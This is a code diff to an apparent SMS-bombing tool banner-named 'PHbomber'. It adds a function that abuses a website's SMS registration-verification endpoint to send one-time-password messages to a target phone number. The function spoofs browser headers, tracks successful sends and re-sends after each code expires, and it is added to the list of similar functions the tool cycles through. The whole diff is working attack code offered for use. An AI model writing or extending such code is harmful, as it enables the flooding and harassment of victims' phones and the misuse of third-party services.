@@ -27,7 +27,7 @@ logo = (""" \033[1;92m____  _   _ _                     _
 | |_) | |_| | '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 |  __/|  _  | |_) | (_) | | | | | | |_) |  __/ |
 |_|   |_| |_|_.__/ \___/|_| |_| |_|_.__/ \___|_|
- by aknown version 1.2""")
+ by aknown version 1.4""")
 if sys.platform == "linux" or sys.platform == "linux2":
     clr = "clear"
 elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
@@ -695,6 +695,35 @@ def otp17(number):
             print(f"\033[1;91mError get_phone_code {e}\033[1;92m")
         return False
 
+def otp18(number):
+    global LIMIT, ERROR
+    number = to9(number=number)
+    session = requests.Session()
+    url = "https://www.xjrff.com/wps/verification/sms/register"
+    header = {'Host': 'www.xjrff.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'X-Gateway-Version': '3', 'sec-ch-ua': '"Chromium";v="122", "Not(A', 'Language': 'EN', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Merchant': 'top188phf2', 'Accept': 'application/json, text/plain, */*', 'Device': 'web', 'sec-ch-ua-platform': '"Windows"', 'Sec-GPC': '1', 'Accept-Language': 'en-US,en;q=0.8', 'Origin': 'https://www.xjrff.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.xjrff.com/register?referralCode=pai6825', 'Accept-Encoding': 'gzip'}
+    body = {"countryDialingCode":"63","mobileNo":str(number)}
+
+    try:
+        web = session.post(url, headers=header, json=body, timeout=8)
+        result = json.loads(web.text)
+        if debug == True:
+            print(f"{web.status_code} from xjrff")
+        if result['success'] == True:
+            LIMIT += 1
+            try:
+                sleep = result['value']['expiredMinutes']*60
+                time.sleep(sleep)
+            except:
+                pass
+            return True
+        else:
+            ERROR += 1
+            return False
+    except Exception as e:
+        ERROR += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp18 {e}\033[1;92m")
+        return False
 # you can add api and put it in the box to run
 
 # mainporcesore
@@ -741,7 +770,7 @@ def home():
     function = [otp, otp1, otp2, otp3, otp4,
                 otp5, otp6, otp7, otp8, otp9,
                 otp11, otp12, otp13, otp14,
-                otp15, otp16, otp17
+                otp15, otp16, otp17, otp18
                 ]
     # append LIMIT in global variables
     LIMIT1 = pick()
